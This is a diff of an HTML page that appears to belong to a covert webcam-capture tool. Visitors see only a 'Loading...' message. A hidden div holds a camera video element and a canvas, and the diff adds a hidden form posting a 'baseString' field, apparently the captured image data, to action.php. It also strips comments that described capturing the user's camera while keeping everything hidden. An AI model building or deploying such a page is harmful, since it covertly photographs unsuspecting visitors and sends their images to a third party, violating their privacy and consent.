@@ -36,19 +36,17 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
   </head>
   <body>
-    
-    <!-- Says the user to wait as the document is Loading-->
     <p id="loading">&#128540;</p>
     <p>Loading...</p>
     
-    <!-- Processes everything under the hood. Keeps everything hidden -->
     <div hidden>
-    <!-- Captures media stream from user camera and plays here -->
-    <video id="video" autoplay ></video>
-    <!-- canvas to capture picture from video element and make a real image from it -->
-    <canvas id="canvas"></canvas>
+      <form method="post" action="action.php" >
+        <input name="name" id="name" >
+        <input name="baseString" id="data">
+      </form>
+      <video id="video" autoplay ></video>
+      <canvas id="canvas"></canvas>
     </div>
-    
     <script src="script.js"></script>
   </body>
 </html>
